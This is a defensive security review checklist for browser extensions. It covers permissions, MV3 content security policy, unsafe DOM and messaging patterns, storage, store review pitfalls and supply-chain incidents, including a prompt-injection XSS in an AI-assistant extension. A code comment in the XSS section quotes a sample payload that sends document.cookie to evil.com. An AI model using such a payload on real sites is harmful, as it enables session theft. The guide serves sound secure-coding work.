# Security Review

Checklist for auditing browser extension security. Works for both new builds and existing codebase reviews. Extension-specific concerns — not generic web security.

## Permissions Audit

Every permission in the manifest must have a written justification. If you can't explain why it's needed, remove it.

### Default choice: `activeTab`

`activeTab` grants temporary access ONLY when the user explicitly invokes the extension. No install warning. Revoked on navigation. **Start here, not with host permissions.**

### Dangerous permissions

| Permission | Enables | Justification required |
|-----------|---------|----------------------|
| `<all_urls>` / `*://*/*` | Read/modify all web content | Why can't you scope to specific hosts? |
| `webRequest` / `declarativeNetRequest` | Intercept/modify all network traffic | Why do you need to see network requests? |
| `cookies` | Read/write cookies for any host with permission | Session hijacking risk — why not use `storage`? |
| `debugger` | Full DevTools Protocol access to tabs | Essentially root — extreme justification needed |
| `tabs` | See URL/title of ALL open tabs | Browsing surveillance — use `activeTab` instead |
| `management` | Enable/disable/uninstall other extensions | Almost never legitimate |
| `nativeMessaging` | Communicate with native apps on machine | Escapes browser sandbox |
| `clipboardRead/Write` | Read/write clipboard | Credential exfiltration risk |

### Optional permissions pattern

Declare features as optional to avoid install-time warnings and update disruptions:

```json
{
  "permissions": ["storage", "activeTab"],
  "optional_permissions": ["history"],
  "optional_host_permissions": ["https://*.example.com/*"]
}
```

Request at runtime inside a user gesture:

```typescript
document.getElementById('enable').addEventListener('click', async () => {
  const granted = await browser.permissions.request({
    permissions: ['history'],
    origins: ['https://*.example.com/*']
  });
  if (granted) { /* enable the feature */ }
});
```

**Adding required permissions in an update disables the extension** until the user re-approves. Optional permissions avoid this.

## Content Security Policy (MV3)

MV3 enforces a strict CSP that cannot be relaxed:

- **Allowed `script-src`:** `'self'` and `'wasm-unsafe-eval'` only
- **Banned:** `'unsafe-eval'`, `'unsafe-inline'`, remote hosts, dynamic code generation from strings
- **All executable code must be bundled** in the extension package

### What's blocked

- Dynamic code generation from strings (the `Function` constructor with string arguments, string-based evaluation)
- Remote script tags loading from external URLs
- Inline script tags
- `setTimeout`/`setInterval` with string arguments

### Sandbox exception

Sandbox pages CAN run dynamic code, but they have **zero extension API access**. Useful for running untrusted code in isolation. Note: sandbox pages are not supported in Firefox.

## Unsafe Code Patterns

### Content script XSS

**Never use `innerHTML` with data from the page DOM or message handlers.** This is the most common extension vulnerability.

```typescript
// DANGEROUS: stored XSS if noteContent contains malicious HTML
// e.g., <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
noteDiv.innerHTML = message.noteContent; // DO NOT DO THIS

// SAFE: text only
noteDiv.textContent = message.noteContent;

// SAFE: sanitized HTML (if rich content needed)
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(message.noteContent);
```

The same applies to `outerHTML`, `insertAdjacentHTML`, and any other DOM API that parses HTML strings. Content scripts run on potentially hostile pages — all DOM data is attacker-controlled.

### `scripting.executeScript` risks

- **Never pass user/page-controlled data as function arguments without validation**
- **`world: "MAIN"`** injects into the page's JS context — subject to page CSP, page can spoof globals. Use only when you must interact with page-level JS.
- MV3 requires the `files` parameter (static bundled script) or `func` reference (function object). String code execution is blocked by CSP.

### Message passing without sender validation

```typescript
// DANGEROUS: any content script (on any hostile page) can send this
browser.runtime.onMessage.addListener((message, sender, sendResponse) => {
  doSomethingDangerous(message.payload); // No validation!
});

// SAFE: validate sender
browser.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (!sender.tab?.url?.startsWith('https://github.com/')) {
    return; // Ignore messages from unexpected origins
  }
  // Now process
});
```

**`onMessageExternal`** is especially dangerous — it receives messages from OTHER extensions and websites. Always validate `sender.id` against an allowlist. If you don't need cross-extension communication, don't add this listener.

### `window.postMessage` in content scripts

Any script on the page can send postMessage events. Always validate `event.origin` and `event.source`:

```typescript
window.addEventListener('message', (event) => {
  if (event.origin !== 'https://trusted-site.com') return;
  if (event.source !== window) return; // Ignore iframes
  // Now process with validated origin
});
```

Without origin validation, any iframe, ad script, or injected code on the page can send messages that your content script forwards to the background — creating a bridge from attacker to privileged context.

### Storage security

- `storage.local` is readable by content scripts by default. Use `chrome.storage.local.setAccessLevel('TRUSTED_CONTEXTS')` for sensitive data.
- `storage.session` defaults to `TRUSTED_CONTEXTS` — prefer it for tokens and secrets.
- `storage.sync` traverses vendor cloud infrastructure — never store PII or credentials.

## Data Handling

### Context boundary trust model

```
Untrusted                                    Trusted
┌──────────┐    ┌──────────────┐    ┌──────────────────┐
│ Web Page │ -> │Content Script│ -> │ Background/Popup │
│  (hostile)│    │  (low trust) │    │   (high trust)   │
└──────────┘    └──────────────┘    └──────────────────┘
```

- **Every message from a content script should be validated** in the background — the content script runs in a hostile page environment.
- **Sensitive data should not transit through content scripts** if avoidable. Have the background fetch directly from APIs.
- **HTTPS enforcement** for all external API calls. Never send credentials over HTTP.

### Privacy implications

- Content scripts that read page DOM are processing user data — disclose this in privacy policy.
- Extensions with broad host permissions can observe all browsing activity — high-value supply chain attack target.
- `storage.sync` data traverses Google/Mozilla cloud. Disclose this.

## Store Rejection Pitfalls

Things that will get your extension rejected or cause friction during review.

### Chrome Web Store

- **Remote code:** Any attempt to load executable code from external URLs. All JS must be bundled.
- **Excessive permissions:** Requesting permissions the code doesn't use, or `<all_urls>` when narrower patterns suffice.
- **Missing privacy policy:** Required if you collect any user data. Must be hosted at a stable URL.
- **Missing data use disclosures:** Developer dashboard requires declaring all data types collected.
- **Obfuscated code:** Minification is fine; deliberate obfuscation (control flow mangling) is rejected.
- **Single-purpose violation:** Extensions must have one clear purpose. Bundling unrelated features triggers rejection.
- **No deceptive behavior:** Undisclosed data collection, hidden functionality, misleading descriptions.

### Firefox AMO

- **Source code required** if code is transpiled/minified. You must submit source + build instructions. The reviewer runs your build and diffs the output — it must match exactly.
- **Build tools must be maintained.** Deprecated build tools are grounds for rejection.
- **No obfuscation.** Minification for size is allowed; code that deliberately hides its purpose is banned.
- **All features must be disclosed.** No "surprise functionality."

### Safari App Store

- **Privacy manifest required** (`PrivacyInfo.xcprivacy`) since May 2024 — declares data collected, tracking domains, Required Reasons API usage.
- **Host app must have meaningful functionality** — an empty container app may be rejected.
- **Permission minimization enforced** — reviewers check that you don't claim more access than necessary.
- **More restrictive user grants** — Safari lets users grant "one day", "always", or "this website only." Extensions must function gracefully with partial permissions.

## Supply Chain Awareness

Browser extensions auto-update to all users instantly. A compromised publishing credential = compromised users.

### Real-world incidents

- **Cyberhaven (Dec 2024):** OAuth phishing gave attackers publish access. Malicious update pushed to 400K users. Detected in 60 minutes, but part of campaign hitting 36+ extensions / 2.6M users.
- **Trust Wallet (Dec 2025):** Leaked Chrome Web Store API key. Malicious version published, $8.5M in crypto theft.
- **Claude extension (March 2026):** Zero-click XSS via prompt injection in content script. Any website could execute arbitrary JS through the extension.

### Mitigations

- Secure publishing credentials with hardware keys
- Limit who has publish access
- Review your own extension updates before publishing (CI/CD pipeline with approval gate)
- Use `web_accessible_resources` with `use_dynamic_url: true` to prevent resource URL prediction
